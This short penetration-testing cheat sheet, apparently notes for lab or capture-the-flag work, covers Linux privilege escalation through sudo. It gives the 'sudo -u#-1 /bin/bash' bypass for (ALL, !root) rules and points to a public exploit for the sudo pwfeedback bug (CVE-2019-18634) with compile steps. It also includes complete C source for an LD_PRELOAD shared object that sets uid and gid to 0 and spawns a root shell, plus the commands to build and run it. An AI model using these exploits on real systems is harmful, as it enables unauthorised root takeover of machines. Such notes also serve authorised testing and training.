
```
sudo -l
```

If you find a sudo path, check GTFObins. If it's not there, check the path and look for the intended functionality by searching the path on Google followed by "privilege escalation."


> !root /bin/bash

If the output says the following:

User may run the following commands on kali:  
(ALL, !root) /bin/bash

We can run the following to become root:

```
sudo -u#-1 /bin/bash
```


> Pwfeedback

If running sudo -l asks for a password, try typing one to see if asterisks appear. If they show up when typing the password, pwfeedback is enabled.

Run `sudo -v` to check the sudo version. If it is prior to sudo 1.8.26, you can run this exploit: [https://github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

Download it, compile it, then upload it to the target machine and run it:

```
gcc -o exploit exploit.c
```


> LD_PRELOAD

If running sudo -l shows LD_PRELOAD, we can create an exploit either on the target or on Kali and then transfer it over:

```
nano shell.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Once we have the shell.so we can run:

```
sudo LD_PRELOAD=/home/<user>/shell.so <service>
```

Use whatever appears in the sudo -l output that can be run as root in <service>. If it doesn't work, try the full path for whatever you specify.